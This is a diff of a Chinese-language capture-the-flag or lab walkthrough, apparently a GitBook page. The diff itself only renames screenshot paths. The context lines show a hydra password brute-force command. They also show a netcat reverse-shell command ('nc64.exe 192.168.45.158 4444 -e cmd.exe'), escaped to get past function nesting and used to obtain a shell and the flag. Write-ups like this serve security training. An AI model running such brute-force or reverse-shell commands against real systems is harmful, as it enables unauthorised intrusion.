@@ -86,11 +86,11 @@ hydra -L /usr/share/secLists/Usernames/Names/names.txt -P /usr/share/SecLists/Pa
 
 * 此时，可再次修改脚本内容，用于执行反弹shell回连到Kali机器上：
 
-<figure><img src="../.gitbook/assets/19 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/19 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 但是返回后的信息显示了一个错误信息，我设置的命令被嵌套在好几个函数中：
 
-<figure><img src="../.gitbook/assets/20 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/20 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 使用反斜杠逃逸：
 
@@ -98,7 +98,7 @@ hydra -L /usr/share/secLists/Usernames/Names/names.txt -P /usr/share/SecLists/Pa
 .\\\\nc64.exe 192.168.45.158 4444 -e cmd.exe
 ```
 
-<figure><img src="../.gitbook/assets/21 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/21 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 监听端口接收到了回连的shell，此时getshell并获得了flag：
 
